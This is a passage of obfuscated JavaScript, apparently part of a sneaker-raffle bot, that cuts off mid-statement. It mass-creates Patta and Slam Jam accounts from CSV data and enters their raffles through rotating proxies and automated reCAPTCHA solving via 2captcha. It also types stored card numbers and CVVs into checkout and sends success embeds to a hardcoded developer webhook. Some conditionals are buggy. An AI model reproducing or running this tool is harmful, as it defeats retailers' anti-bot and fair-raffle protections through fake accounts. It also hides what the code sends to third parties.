                console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x461b58[taskModule]['name'] + ']\x20Task\x20' + (_0x616518 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x3d6c2a));
            }
        } catch (_0x2d400a) {
            console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x461b58[taskModule]['name'] + ']\x20Task\x20' + (_0x616518 + 0x1) + '\x20:\x20' + _0x2d400a));
        } finally {
            _0xb42d32 && _0xb42d32['close'](), console['log']('Waiting\x20for\x20' + _0x401d1c['delay'] + '\x20ms'), await _0x491ae3(_0x401d1c['delay']);
        }
    }
}
async function _0x1662c3(_0x5af9ce, _0xe60a04, _0x3a89e8, _0x3dc785) {
    _0x4efd86['use'](_0x202680()), _0x4efd86['use'](_0x1fedc1({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x401d1c['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x2cea47 = 0x0; _0x2cea47 < _0x3a89e8['length']; _0x2cea47++) {
        var _0x2a684a = [{
            'type': 'rich',
            'title': 'Succesful\x20Patta\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x54444c
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x401d1c['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x431e19
                }
            ]
        }];
        const _0x5b9026 = { 'embeds': _0x2a684a };
        _0x57f604(_0xe60a04['name'] + '\x20Task\x20' + (_0x2cea47 + 0x1) + '\x20/\x20' + _0x3a89e8['length'] + '\x20||\x20File:\x20' + _0xb37a88 + '\x20Proxies:\x20' + _0x39f01a), await _0x238b3c(_0x3a89e8, _0x2cea47);
        var _0x134968 = await _0x344cc9(_0x3a89e8[_0x2cea47], _0xe60a04, 'acc', ![]);
        const _0x412f52 = { 'succesDEVMSG': { 'embeds': [_0x134968] } };
        if (_0x3a89e8[_0x2cea47]['Email'] == '' || _0x3a89e8[_0x2cea47]['FirstName'] == '' || _0x3a89e8[_0x2cea47]['LastName'] == '') {
            console['log'](_0x1e4ea5() + '\x20[' + _0x461b58[taskModule]['name'] + ']\x20Task\x20' + (_0x2cea47 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x491ae3(0x7d0);
            continue;
        }
        (_0x3a89e8[_0x2cea47]['Password'] == '' || _0x3a89e8[_0x2cea47] == undefined) && _0x3a89e8[_0x2cea47]['Password'] == 'JRaffles23!';
        if (_0x401d1c['useRandomProxy'] = ![])
            var _0x493a41 = _0x3dc785[_0x2cea47]['split'](':');
        else
            var _0x5bcc1f = Math['round'](Math['random']() * (_0x3dc785['length'] - 0x1)), _0x493a41 = _0x3dc785[_0x5bcc1f]['split'](':');
        const _0x3a90db = await _0x4efd86['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x493a41[0x0] + ':' + _0x493a41[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x28a3c7 = await _0x3a90db['newPage']();
            await _0x28a3c7['authenticate']({
                'username': '' + _0x493a41[0x2],
                'password': '' + _0x493a41[0x3]
            }), console['log'](_0x1e4ea5() + '\x20[' + _0xe60a04['name'] + ']\x20Task\x20' + (_0x2cea47 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x28a3c7['setRequestInterception'](!![]), _0x28a3c7['on']('request', _0x181c29 => {
                _0x181c29['resourceType']() === 'image' || _0x181c29['resourceType']() === 'font' || _0x181c29['resourceType']() === 'media' ? _0x181c29['abort']() : _0x181c29['continue']();
            }), await _0x28a3c7['goto'](_0x5af9ce), await _0x491ae3(0xbb8), await _0x28a3c7['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x1e4ea5() + '\x20[' + _0xe60a04['name'] + ']\x20Task\x20' + (_0x2cea47 + 0x1) + '\x20:\x20Filling\x20information'), await _0x28a3c7['type']('#RegisterForm-FirstName', '' + _0x3a89e8[_0x2cea47]['FirstName']), await _0x491ae3(0x226), await _0x28a3c7['type']('#RegisterForm-LastName', '' + _0x3a89e8[_0x2cea47]['LastName']), await _0x491ae3(0x226), await _0x28a3c7['type']('#RegisterForm-email', '' + _0x3a89e8[_0x2cea47]['Email']), await _0x491ae3(0x226), await _0x28a3c7['type']('#RegisterForm-password', '' + _0x3a89e8[_0x2cea47]['Password']), await _0x491ae3(0x226), console['log'](_0x1e4ea5() + '\x20[' + _0xe60a04['name'] + ']\x20Task\x20' + (_0x2cea47 + 0x1) + '\x20:\x20Submitting..'), await _0x28a3c7['$eval']('#RegisterForm', _0x16ae5f => _0x16ae5f['submit']()), await _0x491ae3(0x1f40);
            try {
                await _0x28a3c7['waitForSelector']('.home-page-grid__collection'), await _0x491ae3(0x1f4), console['log'](_0x1818b9['green'](_0x1e4ea5() + '\x20[' + _0xe60a04['name'] + ']\x20Task\x20' + (_0x2cea47 + 0x1) + '\x20:\x20Account\x20' + _0x3a89e8[_0x2cea47]['Email'] + '\x20Generated!')), _0x550d6b['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x3a89e8[_0x2cea47]['Email'] + ',' + _0x3a89e8[_0x2cea47]['Password']), console['log'](_0x1818b9['yellow'](_0x1e4ea5() + '\x20[' + _0xe60a04['name'] + ']\x20Task\x20' + (_0x2cea47 + 0x1) + '\x20:\x20Account\x20' + _0x3a89e8[_0x2cea47]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                try {
                    _0x401d1c['webhook'] != undefined && _0x401d1c['webhook'] != '' && await _0xafb19d(_0x401d1c['webhook'], _0x412f52['succesDEVMSG']);
                } catch {
                }
                await _0xafb19d(_0x3cac51, _0x412f52['succesDEVMSG']);
            } catch (_0x37b774) {
                console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x461b58[taskModule]['name'] + ']\x20Task\x20' + (_0x2cea47 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x37b774));
            }
        } catch (_0x3680c1) {
            console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x461b58[taskModule]['name'] + ']\x20Task\x20' + (_0x2cea47 + 0x1) + '\x20:\x20' + _0x3680c1));
        } finally {
            _0x3a90db && _0x3a90db['close'](), console['log']('Waiting\x20for\x20' + _0x401d1c['delay'] + '\x20ms'), await _0x491ae3(_0x401d1c['delay']);
        }
    }
}
async function _0x5015ef(_0x5e6176, _0x48e7ff, _0x1f0375, _0x39ca1a) {
    _0x4efd86['use'](_0x202680()), _0x4efd86['use'](_0x1fedc1({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x401d1c['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x2e71e5 = 0x0; _0x2e71e5 < _0x1f0375['length']; _0x2e71e5++) {
        var _0x3c6a0c, _0x1d860f = '', _0x4c5cfc = 0x0;
        _0x57f604(_0x48e7ff['name'] + '\x20Task\x20' + (_0x2e71e5 + 0x1) + '\x20/\x20' + _0x1f0375['length'] + '\x20||\x20File:\x20' + _0xb37a88 + '\x20Proxies:\x20' + _0x39f01a), await _0x238b3c(_0x1f0375, _0x2e71e5);
        if (_0x1f0375[_0x2e71e5]['Email'] == '' || _0x1f0375[_0x2e71e5]['Password'] == '' || _0x1f0375[_0x2e71e5]['FirstName'] == '' || _0x1f0375[_0x2e71e5]['LastName'] == '') {
            console['log'](_0x1e4ea5() + '\x20[' + _0x461b58[taskModule]['name'] + ']\x20Task\x20' + (_0x2e71e5 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x401d1c['useRandomProxy'] = ![])
            var _0x35794c = _0x39ca1a[_0x2e71e5]['split'](':');
        else
            var _0x6ce13a = Math['round'](Math['random']() * (_0x39ca1a['length'] - 0x1)), _0x35794c = _0x39ca1a[_0x6ce13a]['split'](':');
        const _0x183b90 = await _0x4efd86['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x35794c[0x0] + ':' + _0x35794c[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x1cd215 = await _0x183b90['newPage']();
            await _0x1cd215['authenticate']({
                'username': '' + _0x35794c[0x2],
                'password': '' + _0x35794c[0x3]
            }), console['log'](_0x1e4ea5() + '\x20[' + _0x48e7ff['name'] + ']\x20Task\x20' + (_0x2e71e5 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1cd215['setRequestInterception'](!![]), _0x1cd215['on']('request', _0x538ff2 => {
                _0x538ff2['resourceType']() === 'image' || _0x538ff2['resourceType']() === 'font' || _0x538ff2['resourceType']() === 'media' ? _0x538ff2['abort']() : _0x538ff2['continue']();
            }), await _0x1cd215['goto']('https://www.patta.nl/nl/account/login', {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x1cd215['waitForSelector']('#CustomerEmail'), console['log'](_0x1e4ea5() + '\x20[' + _0x48e7ff['name'] + ']\x20Task\x20' + (_0x2e71e5 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x1cd215['type']('#CustomerEmail', '' + _0x1f0375[_0x2e71e5]['Email']), await _0x491ae3(0x12c), await _0x1cd215['type']('#CustomerPassword', '' + _0x1f0375[_0x2e71e5]['Password']), await _0x491ae3(0x226), await _0x1cd215['$eval']('#customer_login', _0x4ea46c => _0x4ea46c['submit']());
            try {
                await _0x1cd215['waitForSelector']('#orders'), await _0x491ae3(0x4b0);
            } catch {
                console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x48e7ff['name'] + ']\x20Task\x20' + (_0x2e71e5 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                continue;
            }
            await _0x1cd215['goto']('' + _0x1f0375[_0x2e71e5]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x491ae3(0xbb8), console['log'](_0x1e4ea5() + '\x20[' + _0x48e7ff['name'] + ']\x20Task\x20' + (_0x2e71e5 + 0x1) + '\x20:\x20Starting\x20Entry');
            try {
                await _0x1cd215['waitForSelector']('#email');
            } catch {
                console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x48e7ff['name'] + ']\x20Task\x20' + (_0x2e71e5 + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
            }
            await _0x1cd215['type']('#email', '' + _0x1f0375[_0x2e71e5]['Email']), await _0x491ae3(0x384), await _0x1cd215['type']('#first_name', '' + _0x1f0375[_0x2e71e5]['FirstName']), await _0x491ae3(0x514), await _0x1cd215['type']('#last_name', '' + _0x1f0375[_0x2e71e5]['LastName']), await _0x491ae3(0x514), await _0x1cd215['type']('#street_address', _0x1f0375[_0x2e71e5]['Address1'] + '\x20' + _0x1f0375[_0x2e71e5]['HouseNumber'] + '\x20' + _0x1f0375[_0x2e71e5]['Address2']), await _0x491ae3(0x2bc);
            _0x1f0375[_0x2e71e5]['Postcode'] == undefined && (_0x1f0375[_0x2e71e5]['Postcode'] = _0x1f0375[_0x2e71e5]['Zip']);
            await _0x1cd215['type']('#zip_code', '' + _0x1f0375[_0x2e71e5]['Postcode']), await _0x491ae3(0x320), await _0x1cd215['type']('#city', '' + _0x1f0375[_0x2e71e5]['City']), await _0x491ae3(0x320), await _0x1cd215['type']('#bday', '01/01/1994'), await _0x491ae3(0x320), await _0x1cd215['type']('#instagram', '' + _0x1f0375[_0x2e71e5]['Follower']), await _0x491ae3(0x352);
            if (_0x1f0375[_0x2e71e5]['Size'] == 'RANDOM') {
                const _0x4eb6e7 = await _0x1cd215['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x5f240 => {
                    return _0x5f240['map'](_0x20289a => _0x20289a['textContent']);
                });
                var _0x23af35 = Math['round'](Math['random']() * (_0x4eb6e7['length'] - 0x1));
                console['log'](_0x1e4ea5() + '\x20[' + _0x48e7ff['name'] + ']\x20Task\x20' + (_0x2e71e5 + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x4eb6e7[_0x23af35]), await _0x1cd215['click']('label[data-eu-size=\x22' + _0x4eb6e7[_0x23af35] + '\x22]');
            } else {
                console['log'](_0x1e4ea5() + '\x20[' + _0x48e7ff['name'] + ']\x20Task\x20' + (_0x2e71e5 + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x1f0375[_0x2e71e5]['Size']);
                try {
                    await _0x1cd215['click']('label[data-eu-size=\x22' + _0x1f0375[_0x2e71e5]['Size'] + '\x22]');
                } catch {
                    await _0x1cd215['click']('label[data-eu-size=\x22' + _0x1f0375[_0x2e71e5]['Size'] + '.0\x22]');
                }
            }
            await _0x491ae3(0xbb8), await _0x1cd215['$$eval']('.raffle__checkbox-label', _0x16bee7 => _0x16bee7['forEach'](_0x3a00ea => _0x3a00ea['click']())), await _0x491ae3(0x7d0), console['log'](_0x1e4ea5() + '\x20[' + _0x48e7ff['name'] + ']\x20Task\x20' + (_0x2e71e5 + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x1cd215['click']('#raffle__form-submit'), await _0x491ae3(0x1388);
            try {
                await _0x1cd215['waitForSelector']('#raffle__confirmation-message-container'), console['log'](_0x1818b9['green'](_0x1e4ea5() + '\x20[' + _0x48e7ff['name'] + ']\x20Task\x20' + (_0x2e71e5 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            } catch (_0x4220a2) {
                console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x461b58[taskModule]['name'] + ']\x20Task\x20' + (_0x2e71e5 + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x4220a2));
            }
        } catch (_0xfe00cf) {
            console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x461b58[taskModule]['name'] + ']\x20Task\x20' + (_0x2e71e5 + 0x1) + '\x20:\x20' + _0xfe00cf)), _0x1d860f = 'yes';
        } finally {
            _0x183b90 && _0x183b90['close']();
            if (_0x1d860f == 'yes' && _0x4c5cfc != 0x5) {
                console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x48e7ff['name'] + ']\x20Task\x20' + (_0x2e71e5 + 0x1) + '\x20:\x20Retrying')), _0x2e71e5 = _0x2e71e5 - 0x1, _0x4c5cfc = _0x4c5cfc + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x401d1c['delay'] + '\x20ms'), await _0x491ae3(_0x401d1c['delay']);
        }
    }
}
async function _0x4085e5(_0x1390da, _0x39b6ea, _0x2d7444, _0x5d77ab) {
    _0x4efd86['use'](_0x202680()), _0x4efd86['use'](_0x1fedc1({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x401d1c['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x4693aa = 0x0; _0x4693aa < _0x2d7444['length']; _0x4693aa++) {
        var _0x1f3d23 = [{
            'type': 'rich',
            'title': 'Succesful\x20Patta\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x54444c
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x401d1c['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x431e19
                }
            ]
        }];
        const _0x161d35 = { 'embeds': _0x1f3d23 };
        _0x57f604(_0x39b6ea['name'] + '\x20Task\x20' + (_0x4693aa + 0x1) + '\x20/\x20' + _0x2d7444['length'] + '\x20||\x20File:\x20' + _0xb37a88 + '\x20Proxies:\x20' + _0x39f01a), await _0x238b3c(_0x2d7444, _0x4693aa);
        var _0x346b88 = await _0x344cc9(_0x2d7444[_0x4693aa], _0x39b6ea, 'acc', ![]);
        const _0xf42de0 = { 'succesDEVMSG': { 'embeds': [_0x346b88] } };
        if (_0x2d7444[_0x4693aa]['Email'] == '' || _0x2d7444[_0x4693aa]['FirstName'] == '' || _0x2d7444[_0x4693aa]['LastName'] == '') {
            console['log'](_0x1e4ea5() + '\x20[' + _0x461b58[taskModule]['name'] + ']\x20Task\x20' + (_0x4693aa + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x491ae3(0x7d0);
            continue;
        }
        (_0x2d7444[_0x4693aa]['Password'] == '' || _0x2d7444[_0x4693aa] == undefined) && _0x2d7444[_0x4693aa]['Password'] == 'JRaffles23!';
        if (_0x401d1c['useRandomProxy'] = ![])
            var _0x24512b = _0x5d77ab[_0x4693aa]['split'](':');
        else
            var _0x38aaad = Math['round'](Math['random']() * (_0x5d77ab['length'] - 0x1)), _0x24512b = _0x5d77ab[_0x38aaad]['split'](':');
        const _0x1ac074 = await _0x4efd86['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x24512b[0x0] + ':' + _0x24512b[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x4c882b = await _0x1ac074['newPage']();
            await _0x4c882b['authenticate']({
                'username': '' + _0x24512b[0x2],
                'password': '' + _0x24512b[0x3]
            }), console['log'](_0x1e4ea5() + '\x20[' + _0x39b6ea['name'] + ']\x20Task\x20' + (_0x4693aa + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4c882b['setRequestInterception'](!![]), _0x4c882b['on']('request', _0x91e846 => {
                _0x91e846['resourceType']() === 'image' || _0x91e846['resourceType']() === 'font' || _0x91e846['resourceType']() === 'media' ? _0x91e846['abort']() : _0x91e846['continue']();
            }), await _0x4c882b['goto']('https://drop.slamjam.com/account/register'), await _0x491ae3(0xbb8), await _0x4c882b['waitForSelector']('#FirstName'), await _0x4c882b['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x4c882b['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x1e4ea5() + '\x20[' + _0x39b6ea['name'] + ']\x20Task\x20' + (_0x4693aa + 0x1) + '\x20:\x20Filling\x20information'), await _0x491ae3(0x4b0), await _0x4c882b['type']('#FirstName', '' + _0x2d7444[_0x4693aa]['FirstName']), await _0x491ae3(0x226), await _0x4c882b['type']('#LastName', '' + _0x2d7444[_0x4693aa]['LastName']), await _0x491ae3(0x226), await _0x4c882b['type']('#Email', '' + _0x2d7444[_0x4693aa]['Email']), await _0x491ae3(0x2ee), await _0x4c882b['type']('#ConfirmEmail', '' + _0x2d7444[_0x4693aa]['Email']), await _0x491ae3(0x2ee), await _0x4c882b['type']('#CreatePassword', '' + _0x2d7444[_0x4693aa]['Password']), await _0x491ae3(0x2ee), await _0x4c882b['type']('#CreateConfirmPassword', '' + _0x2d7444[_0x4693aa]['Password']), await _0x491ae3(0x226), console['log'](_0x1e4ea5() + '\x20[' + _0x39b6ea['name'] + ']\x20Task\x20' + (_0x4693aa + 0x1) + '\x20:\x20Submitting..'), await _0x4c882b['$eval']('#create_customer', _0xd6f85a => _0xd6f85a['submit']()), await _0x491ae3(0x1388), console['log'](_0x1e4ea5() + '\x20[' + _0x39b6ea['name'] + ']\x20Task\x20' + (_0x4693aa + 0x1) + '\x20:\x20' + _0x1818b9['cyan']('Solving\x20Captcha')), await _0x4c882b['solveRecaptchas'](), console['log'](_0x1e4ea5() + '\x20[' + _0x39b6ea['name'] + ']\x20Task\x20' + (_0x4693aa + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x4c882b['$eval']('.shopify-challenge__container\x20>\x20form', _0x40c5fb => _0x40c5fb['submit']());
            try {
                await _0x4c882b['waitForSelector']('.product-card__image'), await _0x491ae3(0x1f4), console['log'](_0x1818b9['green'](_0x1e4ea5() + '\x20[' + _0x39b6ea['name'] + ']\x20Task\x20' + (_0x4693aa + 0x1) + '\x20:\x20Account\x20' + _0x2d7444[_0x4693aa]['Email'] + '\x20Generated!')), _0x550d6b['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x2d7444[_0x4693aa]['Email'] + ',' + _0x2d7444[_0x4693aa]['Password']), console['log'](_0x1818b9['yellow'](_0x1e4ea5() + '\x20[' + _0x39b6ea['name'] + ']\x20Task\x20' + (_0x4693aa + 0x1) + '\x20:\x20Account\x20' + _0x2d7444[_0x4693aa]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                try {
                    _0x401d1c['webhook'] != undefined && _0x401d1c['webhook'] != '' && await _0xafb19d(_0x401d1c['webhook'], _0xf42de0['succesDEVMSG']);
                } catch {
                }
                await _0xafb19d(_0x3cac51, _0xf42de0['succesDEVMSG']);
            } catch (_0x22f4c5) {
                console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x461b58[taskModule]['name'] + ']\x20Task\x20' + (_0x4693aa + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x22f4c5));
            }
        } catch (_0x33924c) {
            console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x461b58[taskModule]['name'] + ']\x20Task\x20' + (_0x4693aa + 0x1) + '\x20:\x20' + _0x33924c));
        } finally {
            _0x1ac074 && _0x1ac074['close'](), console['log']('Waiting\x20for\x20' + _0x401d1c['delay'] + '\x20ms'), await _0x491ae3(_0x401d1c['delay']);
        }
    }
}
async function _0x1cc55b(_0x147918, _0x10671f, _0x4fa2dd, _0x59a2da) {
    _0x4efd86['use'](_0x202680()), _0x4efd86['use'](_0x1fedc1({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x401d1c['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x379ae1 = 0x0; _0x379ae1 < _0x4fa2dd['length']; _0x379ae1++) {
        var _0x2c06db, _0x40f88d = '', _0x10037a = 0x0;
        _0x57f604(_0x10671f['name'] + '\x20Task\x20' + (_0x379ae1 + 0x1) + '\x20/\x20' + _0x4fa2dd['length'] + '\x20||\x20File:\x20' + _0xb37a88 + '\x20Proxies:\x20' + _0x39f01a), await _0x238b3c(_0x4fa2dd, _0x379ae1);
        if (_0x4fa2dd[_0x379ae1]['Email'] == '' || _0x4fa2dd[_0x379ae1]['Password'] == '' || _0x4fa2dd[_0x379ae1]['FirstName'] == '' || _0x4fa2dd[_0x379ae1]['LastName'] == '') {
            console['log'](_0x1e4ea5() + '\x20[' + _0x10671f['name'] + ']\x20Task\x20' + (_0x379ae1 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x401d1c['useRandomProxy'] = ![])
            var _0x40ca62 = _0x59a2da[_0x379ae1]['split'](':');
        else
            var _0x294f26 = Math['round'](Math['random']() * (_0x59a2da['length'] - 0x1)), _0x40ca62 = _0x59a2da[_0x294f26]['split'](':');
        const _0x320880 = await _0x4efd86['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x40ca62[0x0] + ':' + _0x40ca62[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials'
            ]
        });
        try {
            const _0x571961 = await _0x320880['newPage']();
            await _0x571961['authenticate']({
                'username': '' + _0x40ca62[0x2],
                'password': '' + _0x40ca62[0x3]
            }), await _0x571961['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), console['log'](_0x1e4ea5() + '\x20[' + _0x10671f['name'] + ']\x20Task\x20' + (_0x379ae1 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x571961['setRequestInterception'](!![]), _0x571961['on']('request', _0x3b3e84 => {
                _0x3b3e84['resourceType']() === 'image' || _0x3b3e84['resourceType']() === 'font' || _0x3b3e84['resourceType']() === 'media' ? _0x3b3e84['abort']() : _0x3b3e84['continue']();
            }), await _0x571961['goto']('https://drop.slamjam.com/account/login', {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x571961['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x571961['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x491ae3(0x258), await _0x571961['waitForSelector']('#CustomerEmail'), console['log'](_0x1e4ea5() + '\x20[' + _0x10671f['name'] + ']\x20Task\x20' + (_0x379ae1 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x571961['type']('#CustomerEmail', '' + _0x4fa2dd[_0x379ae1]['Email']), await _0x491ae3(0x12c), await _0x571961['type']('#CustomerPassword', '' + _0x4fa2dd[_0x379ae1]['Password']), await _0x491ae3(0x226), await _0x571961['$eval']('#customer_login', _0x31f3c6 => _0x31f3c6['submit']()), await _0x491ae3(0x7d0), await _0x571961['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x1e4ea5() + '\x20[' + _0x10671f['name'] + ']\x20Task\x20' + (_0x379ae1 + 0x1) + '\x20:\x20' + _0x1818b9['cyan']('Solving\x20Captcha')), await _0x571961['solveRecaptchas'](), console['log'](_0x1e4ea5() + '\x20[' + _0x10671f['name'] + ']\x20Task\x20' + (_0x379ae1 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x571961['$eval']('.shopify-challenge__container\x20>\x20form', _0x2ee0db => _0x2ee0db['submit']());
            try {
                await _0x571961['waitForSelector']('.nav-account'), await _0x491ae3(0x4b0);
            } catch {
                console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x10671f['name'] + ']\x20Task\x20' + (_0x379ae1 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                continue;
            }
            await _0x571961['goto']('' + _0x4fa2dd[_0x379ae1]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x491ae3(0xbb8), console['log'](_0x1e4ea5() + '\x20[' + _0x10671f['name'] + ']\x20Task\x20' + (_0x379ae1 + 0x1) + '\x20:\x20Starting\x20Entry');
            try {
                await _0x571961['waitForSelector']('#ProductSelect-product-template-raffle');
            } catch {
            }
            await _0x571961['click']('.product-select-variant-wrapper'), await _0x491ae3(0x320), await _0x571961['click']('li.product-select-variant__value[data-size=\x22' + _0x4fa2dd[_0x379ae1]['Size'] + '\x22]'), await _0x491ae3(0x384), await _0x571961['$eval']('#AddToCartForm-product-template-raffle', _0x5cc220 => _0x5cc220['submit']()), await _0x571961['waitForSelector']('.cart-order-summary__content'), await _0x491ae3(0x514), await _0x571961['goto']('https://drop.slamjam.com/checkout'), await _0x491ae3(0x514), await _0x571961['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x1e4ea5() + '\x20[' + _0x10671f['name'] + ']\x20Task\x20' + (_0x379ae1 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x571961['select']('#checkout_shipping_address_country', '' + _0x4fa2dd[_0x379ae1]['Country']), await _0x491ae3(0x200), await _0x571961['waitForSelector']('#checkout_shipping_address_first_name'), await _0x571961['type']('#checkout_shipping_address_first_name', '' + _0x4fa2dd[_0x379ae1]['FirstName']), await _0x491ae3(0x237), await _0x571961['type']('#checkout_shipping_address_last_name', '' + _0x4fa2dd[_0x379ae1]['LastName']), await _0x491ae3(0x1e0), await _0x571961['type']('#checkout_shipping_address_address1', _0x4fa2dd[_0x379ae1]['Address1'] + '\x20' + _0x4fa2dd[_0x379ae1]['HouseNumber']), await _0x491ae3(0x514), await _0x571961['type']('#checkout_shipping_address_address2', '' + _0x4fa2dd[_0x379ae1]['Address2']), await _0x491ae3(0x514);
            _0x4fa2dd[_0x379ae1]['Postcode'] == undefined && (_0x4fa2dd[_0x379ae1]['Postcode'] = _0x4fa2dd[_0x379ae1]['Zip']);
            await _0x571961['type']('#checkout_shipping_address_zip', '' + _0x4fa2dd[_0x379ae1]['Postcode']), await _0x491ae3(0x2bc), await _0x571961['type']('#checkout_shipping_address_city', '' + _0x4fa2dd[_0x379ae1]['City']), await _0x491ae3(0x320), await _0x571961['type']('#checkout_shipping_address_phone', '' + _0x4fa2dd[_0x379ae1]['Phone']), await _0x491ae3(0x320), await _0x571961['click']('#continue_button'), await _0x491ae3(0xbb8), await _0x571961['waitForSelector']('.summary-title'), await _0x491ae3(0x320), await _0x571961['click']('#continue_button'), await _0x491ae3(0x320), console['log'](_0x1e4ea5() + '\x20[' + _0x10671f['name'] + ']\x20Task\x20' + (_0x379ae1 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x571961['waitForSelector']('#checkout_credit_card_vault'), await _0x491ae3(0x3e8);
            var _0xb19cc = await _0x571961['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x413b5c = await _0xb19cc['contentFrame']();
            await _0x413b5c['click']('#number'), await _0x491ae3(0x3e8), await _0x413b5c['type']('#number', '' + _0x4fa2dd[_0x379ae1]['CardNumber'], { 'delay': 0x78 }), _0xb19cc = await _0x571961['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x413b5c = await _0xb19cc['contentFrame'](), await _0x491ae3(0x1c2), await _0x413b5c['click']('#name'), await _0x491ae3(0x1f4), await _0x413b5c['type']('#name', '' + _0x4fa2dd[_0x379ae1]['NameOnCard'], { 'delay': 0x78 }), _0xb19cc = await _0x571961['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x413b5c = await _0xb19cc['contentFrame'](), await _0x491ae3(0x1c2), await _0x413b5c['click']('#expiry'), await _0x491ae3(0x1f4), await _0x413b5c['type']('#expiry', '' + _0x4fa2dd[_0x379ae1]['ExpiryDate'], { 'delay': 0x78 }), _0xb19cc = await _0x571961['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x413b5c = await _0xb19cc['contentFrame'](), await _0x491ae3(0x1c2), await _0x413b5c['click']('#verification_value'), await _0x491ae3(0x1f4), await _0x413b5c['type']('#verification_value', '' + _0x4fa2dd[_0x379ae1]['CVV'], { 'delay': 0x78 }), await _0x571961['$eval']('#accepts-flag-raffle', _0x1fb4fb => _0x1fb4fb['click']()), await _0x491ae3(0x7d0), console['log'](_0x1e4ea5() + '\x20[' + _0x10671f['name'] + ']\x20Task\x20' + 